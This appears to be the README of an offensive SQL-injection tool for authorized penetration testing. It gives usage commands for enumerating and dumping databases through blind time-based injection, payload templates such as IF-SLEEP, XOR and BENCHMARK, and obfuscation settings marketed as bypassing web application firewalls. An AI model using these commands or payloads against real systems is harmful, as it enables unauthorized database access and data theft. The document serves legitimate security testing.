# DeepInject

Advanced Blind SQL Injection Research Framework

```
  _____                 _____       _           _
 |  __ \               |_   _|     (_)         | |
 | |  | | ___  ___ _ __  | |  _ __  _  ___  ___| |_
 | |  | |/ _ \/ _ \ '_ \ | | | '_ \| |/ _ \/ __| __|
 | |__| |  __/  __/ |_) || |_| | | | |  __/ (__| |_
 |_____/ \___|\___| .__/_____|_| |_| |\___|\___|\__|
                  | |             _/ |
                  |_|            |__/

  v2.0  |  Author : JackTekno
```

> **For authorized penetration testing and security research only.**
> Only use on systems you own or have explicit written permission to test.

---

## Features

- **Multiple injection types** — `multipart/form-data`, `form`, `json`, `GET`, `cookie`, `header`
- **8 payload wrapper styles** — including double-query XOR that bypasses WAFs which block sqlmap
- **WAF bypass & obfuscation** — space substitution, case mixing, inline comment splitting (levels 0–3)
- **Auto-detect** — automatically finds a working payload style out of 8 candidates
- **Full DB enumeration** — databases → tables → columns → data dump
- **Server fingerprint** — version, current user, hostname, data directory, privileges
- **Binary search extraction** — ~7 requests per character
- **Parallel character extraction** — `--threads N` for faster results
- **Adaptive timing** — calibrate baseline, configurable sleep/threshold/retries
- **Multiple DBMS** — MySQL, MSSQL, PostgreSQL, Oracle, SQLite
- **Output formats** — `txt`, `json`, `csv`
- **Verbose mode** — shows elapsed time per request for debugging
- **Custom query extraction** — run any SQL and extract the result

---

## Why not just sqlmap?

sqlmap is great, but it struggles with:

| Scenario | sqlmap | DeepInject |
|---|---|---|
| Complex multipart + file upload forms | Often fails to reconstruct correctly | Native `--file-fields` support |
| Custom payload wrapping required | Limited control | 8 named styles, pick manually or auto-detect |
| WAF tuned against sqlmap signatures | Detected | Double-query XOR style (style 6) evades most |
| Stacked parameter ordering | Inconsistent | Exact field order preserved |

---

## Installation

```bash
git clone https://github.com/JackTekno/DeepInject
cd DeepInject
pip install requests
```

Python 3.7+ required.

---

## Usage

```
python3 deepinject.py -u URL --type TYPE --param PARAM [options]
```

### Quick examples

**Multipart/form-data with file upload field**
```bash
python3 deepinject.py \
  -u "https://target.local/upload.php" \
  --type multipart \
  --param vulnerable_field \
  --fields "field1=value1,field2=value2" \
  --file-fields file_upload_field \
  --cookie "PHPSESSID=your_session" \
  --enum-db
```

**POST form (application/x-www-form-urlencoded)**
```bash
python3 deepinject.py \
  -u "https://target.local/search.php" \
  --type form \
  --param keyword \
  --fields "category=news" \
  --enum-tables --db target_db
```

**GET parameter**
```bash
python3 deepinject.py \
  -u "https://target.local/item.php" \
  --type get \
  --param id \
  --fingerprint --enum-db
```

**JSON API**
```bash
python3 deepinject.py \
  -u "https://target.local/api/search" \
  --type json \
  --param query \
  --json-body '{"query":"x","limit":10}' \
  --enum-tables --db target_db
```

**Cookie injection**
```bash
python3 deepinject.py \
  -u "https://target.local/dashboard" \
  --type cookie \
  --param user_token \
  --enum-db
```

---

## Workflow

```
1. Verify      --verify
2. Fingerprint --fingerprint
3. Enum DB     --enum-db
4. Enum Tables --enum-tables --db <db>
5. Enum Cols   --enum-columns --db <db> --table <tbl>
6. Dump Data   --dump --db <db> --table <tbl> --columns <col1,col2>
```

---

## All Options

| Option | Default | Description |
|---|---|---|
| `-u URL` | required | Target URL |
| `--type` | `multipart` | Injection type: `multipart`, `form`, `json`, `get`, `cookie`, `header` |
| `--param` | required | Parameter name to inject |
| `--fields` | — | Extra form fields: `key1=val1,key2=val2` |
| `--file-fields` | — | File-upload fields in multipart: `file1,file2` |
| `--json-body` | — | JSON body string for `--type json` |
| `--cookie` | — | Cookies: `key1=val1;key2=val2` |
| `-H HEADER` | — | Extra header (repeatable): `-H "Referer: ..."` |
| `--dbms` | `mysql` | Target DBMS: `mysql`, `mssql`, `pgsql`, `oracle`, `sqlite` |
| `--sleep` | `5` | SLEEP seconds for time-based detection |
| `--threshold` | `3.5` | Minimum elapsed time (s) to consider delayed |
| `--retries` | `3` | Retries per request |
| `--timeout` | `20` | HTTP request timeout |
| `--max-len` | `128` | Max string length to extract |
| `--threads` | `1` | Parallel threads for character extraction |
| `--obfuscate` | `0` | Obfuscation level 0–3 |
| `--payload-style` | `6` | Payload wrapper 0–7 |
| `--proxy` | — | Proxy URL: `http://127.0.0.1:8080` |
| `-v, --verbose` | — | Show elapsed time per request |
| `--auto-detect` | — | Auto-find working payload style |
| `--calibrate` | — | Measure baseline response time |
| `--verify` | — | Check vulnerability only, then exit |
| `--fingerprint` | — | Get server info (version, user, host, datadir) |
| `--enum-db` | — | List all databases |
| `--enum-tables` | — | List tables in `--db` |
| `--enum-columns` | — | List columns in `--db --table` |
| `--dump` | — | Dump rows from `--db --table --columns` |
| `--dump-limit` | `50` | Max rows to dump |
| `--query` | — | Extract result of custom SQL query |
| `-o FILE` | — | Save output to file |
| `--fmt` | `txt` | Output format: `txt`, `json`, `csv` |

---

## Payload Styles (`--payload-style N`)

| # | Name | Format | Notes |
|---|---|---|---|
| 0 | IF-SLEEP | `IF(cond,SLEEP(n),0)` | Standard |
| 1 | SUBQUERY | `(SELECT 0 FROM(SELECT SLEEP)A WHERE cond)` | Nested |
| 2 | XOR | `1 XOR(IF(cond,SLEEP,0)) XOR 1` | XOR logic |
| 3 | CASE | `CASE WHEN cond THEN SLEEP ELSE 0 END` | CASE WHEN |
| 4 | ELT | `ELT(cond,SLEEP(n))` | ELT function |
| 5 | AND-SLEEP | `1 AND SLEEP(IF(cond,n,0))` | AND clause |
| **6** | **DOUBLE-XOR** | `1+((SELECT 1 FROM(SELECT IF(...))A))/*XOR...*/` | **Default — best WAF bypass** |
| 7 | BENCHMARK | `BENCHMARK(10000000,SHA1(1))` | CPU-based, no SLEEP |

---

## Obfuscation Levels (`--obfuscate N`)

| Level | Effect |
|---|---|
| 0 | No change |
| 1 | Space → `/**/` or `%09` |
| 2 | + keyword case mixing (`SeLeCt`, `SlEeP`) |
| 3 | + inline comment splitting (`SL/**/EEP`) |

---

## DBMS Support

| DBMS | Time-based | Enumeration | Dump |
|---|---|---|---|
| MySQL | `SLEEP(n)` | Full | Yes |
| MSSQL | `WAITFOR DELAY` | Full | Yes |
| PostgreSQL | `pg_sleep(n)` | Full | Yes |
| Oracle | `DBMS_LOCK.SLEEP` | Partial | Yes |
| SQLite | `RANDOMBLOB` | Partial | Yes |

---

## Save Output

```bash
# Save as JSON
python3 deepinject.py ... --dump -o result.json --fmt json

# Save as CSV
python3 deepinject.py ... --dump -o result.csv --fmt csv

# Save as text
python3 deepinject.py ... --enum-db -o databases.txt --fmt txt
```

---

## Tips

**Session expired / no delay detected:**
- Update `--cookie` with a fresh session
- Run `--auto-detect` to find a working payload style
- Use `--verbose` to see actual elapsed times
- Run `--calibrate` to check baseline response time

**Speed up extraction:**
```bash
--threads 4   # extract 4 chars in parallel
--sleep 3     # reduce sleep if connection is stable
```

**Behind a WAF:**
```bash
--payload-style 6 --obfuscate 2
```

---

## Disclaimer

This tool is intended for **authorized security testing, penetration testing engagements, CTF competitions, and security research only**.

Unauthorized use against systems you do not own or have explicit written permission to test is **illegal** and may result in criminal prosecution. The author assumes no liability for misuse.

---

## Author

**JackTekno**
GitHub: [https://github.com/JackTekno](https://github.com/JackTekno)

---

## License

MIT License — see [LICENSE](LICENSE) for details.
